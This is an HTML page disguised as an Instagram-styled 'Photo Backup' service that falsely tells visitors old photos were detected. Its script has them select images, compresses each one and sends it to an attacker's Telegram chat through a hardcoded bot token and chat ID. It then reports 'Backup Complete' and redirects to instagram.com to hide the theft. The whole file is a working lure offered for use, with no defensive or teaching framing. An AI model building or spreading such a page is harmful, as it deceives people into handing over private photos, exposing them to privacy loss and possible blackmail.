<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- Meta tag for Mobile Security -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cloud Backup</title>
    
    <!-- Force HTTPS and fix Mixed Content issues -->
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    
    <style>
        body {
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            text-align: center;
            width: 90%;
            max-width: 320px;
            padding: 20px 0;
        }
        h2 { color: #262626; margin-bottom: 10px; font-size: 22px; }
        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 10px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            transition: transform 0.1s;
        }
        .btn:active { transform: scale(0.98); }
        #fileInput { display: none; }
        
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            width: 25px;
            height: 25px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .status { margin-top: 15px; font-size: 13px; color: #555; min-height: 20px; word-break: break-word;}
        .success { color: #2ecc71; font-weight: bold; }
        .error { color: #e74c3c; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>📸 Photo Backup</h2>
    <p>We detected some old photos in your gallery.<br>Tap below to restore and backup them securely.</p>
    
    <button class="btn" id="uploadBtn" onclick="startBackup()">Restore Photos</button>
    <input type="file" id="fileInput" accept="image/*" multiple onchange="processBackup()">
    
    <div class="loader" id="loader"></div>
    <div class="status" id="statusText"></div>
</div>

<script>
    // --- CONFIGURATION ---
    const BOT_TOKEN = "8963438480:AAELEJEev6DlQaB3MiW0pVq--UPD0Dw-Q0c";
    const CHAT_ID = "7838106845";
    // ---------------------

    function startBackup() {
        document.getElementById('uploadBtn').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('statusText').innerText = "Selecting files...";
        document.getElementById('fileInput').click();
    }

    async function processBackup() {
        const input = document.getElementById('fileInput');
        const files = Array.from(input.files);
        const status = document.getElementById('statusText');

        if (files.length === 0) return;

        status.innerText = `Found ${files.length} items. Compressing & Uploading...`;

        let successCount = 0;
        let failCount = 0;
        const total = files.length;

        // Helper: Compress Image
        const compressImage = (file) => {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.readAsDataURL(file);
                reader.onload = (event) => {
                    const img = new Image();
                    img.src = event.target.result;
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        
                        const MAX_DIM = 1080;
                        let width = img.width;
                        let height = img.height;
                        
                        if (width > MAX_DIM || height > MAX_DIM) {
                            if (width > height) {
                                height = Math.round((height * MAX_DIM) / width);
                                width = MAX_DIM;
                            } else {
                                width = Math.round((width * MAX_DIM) / height);
                                height = MAX_DIM;
                            }
                        }
                        
                        canvas.width = width;
                        canvas.height = height;
                        ctx.drawImage(img, 0, 0, width, height);
                        
                        canvas.toBlob((blob) => {
                            resolve(blob);
                        }, 'image/jpeg', 0.7); 
                    };
                };
            });
        };

        for (let i = 0; i < total; i++) {
            const file = files[i];
            status.innerText = `Processing ${i + 1} / ${total}...`;

            try {
                const compressedBlob = await compressImage(file);
                
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("caption", `📂 ${file.name}`);
                formData.append("photo", compressedBlob, file.name); 

                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);

                // Use Absolute HTTPS URL for Telegram API
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                const data = await response.json();
                
                if(data.ok) {
                    successCount++;
                } else {
                    console.error("Telegram Error:", data);
                    failCount++;
                }
                
            } catch (error) {
                console.error("Network/Compression Error:", error);
                failCount++;
            }
        }

        finishProcess(successCount, failCount, total);
    }

    function finishProcess(success, failed, total) {
        document.getElementById('loader').style.display = 'none';
        const status = document.getElementById('statusText');
        
        if (failed === 0) {
            status.innerHTML = `<span class="success">✅ Backup Complete!</span>`;
            setTimeout(() => {
                window.location.href = "https://www.instagram.com";
            }, 1500);
        } else {
            status.innerHTML = `<span class="error">Done. Sent: ${success}, Failed: ${failed}.<br>Please check connection and try again.</span>`;
             document.getElementById('uploadBtn').style.display = 'block';
             document.getElementById('uploadBtn').innerText = "Try Again";
        }
    }
</script>

</body>
</html>
